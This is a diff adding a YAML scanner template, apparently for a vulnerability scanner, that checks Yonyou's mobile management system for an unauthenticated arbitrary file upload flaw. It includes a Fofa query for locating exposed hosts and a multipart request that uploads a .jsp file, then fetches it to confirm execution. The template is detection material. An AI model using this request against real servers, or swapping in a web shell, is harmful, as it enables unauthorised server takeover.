@@ -1,0 +1,41 @@
+id: yonyou-uploadicon-do-fileupload
+
+info:
+  name: 用友移动系统管理uploadIcon.do接口存在任意文件上传漏洞
+  author: zan8in
+  severity: critical
+  verified: true
+  descritpion: |-
+    用友移动管理系统 /maportal/appmanager/uploadIcon.do、/mobsm/common/upload等接口存在任意文件上传漏洞，未经授权攻击者通过漏洞上传任意文件，最终可以获取服务器权限。
+    Fofa: app="用友-移动系统管理"
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247485034&idx=1&sn=a2c1f085ca37f6b3a36fa22b395b5767&chksm=974b8b6da03c027bf60ea2c3a7980f2516cd0c347144cd047fe0c2835b922702336bf8755791&scene=21#wechat_redirect
+  tags: yonyou,fileupload
+  created: 2024/01/16
+
+set:
+  rboundary: randomLowercase(8)
+  filename: randomLowercase(6)
+  bodystr: randomLowercase(16)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /maportal/appmanager/uploadIcon.do
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"iconFile\"; filename=\"{{filename}}.jsp\"\r\n\
+        \r\n\
+        {{bodystr}}\r\n\
+        \r\n\
+        ------WebKitFormBoundary{{rboundary}}--\r\n\
+        "
+    expression: response.status == 200 && response.body.bcontains(b'"status":2')
+  r1:
+    request:
+      method: GET
+      path: /maupload/img/{{filename}}.jsp
+    expression: response.status == 200 && response.body.bcontains(bytes(bodystr))
+expression: r0() && r1()
